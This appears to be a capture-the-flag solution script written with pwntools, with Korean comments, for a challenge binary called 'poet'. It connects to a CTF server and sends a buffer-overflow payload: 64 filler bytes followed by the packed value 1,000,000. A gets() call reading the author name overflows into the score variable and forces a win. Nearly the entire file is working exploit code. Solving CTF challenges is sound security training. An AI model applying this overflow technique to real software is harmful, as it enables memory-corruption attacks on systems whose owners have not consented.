#! -*- coding: utf-8 -*-
from pwn import *


p = process("./poet")
p = remote("ctf.j0n9hyun.xyz",3012)

#ESPR 이라는 문자열과 1차 비교 ,eat과 2차 비교 ,sleep과 3차 비교 ,pwn과 4차 비교 
# repeat 과 5차 비교 , CTF , capture , flag 
# rate 함수가 끝난 다음, 점수를 특정위치에 저장하고 가져와서 1,000,000과 비교해본다.
# gets 함수로 0x6024a0 에 저자명을 입력받는다. 점수를 가져오는곳은 0x6024e0 위치. 64바이트만큼 덮어보자.

p.sendlineafter(">","a")

payload = "a"*64
payload += p32(0xf4240)
pause()
p.sendlineafter(">",payload)

p.interactive()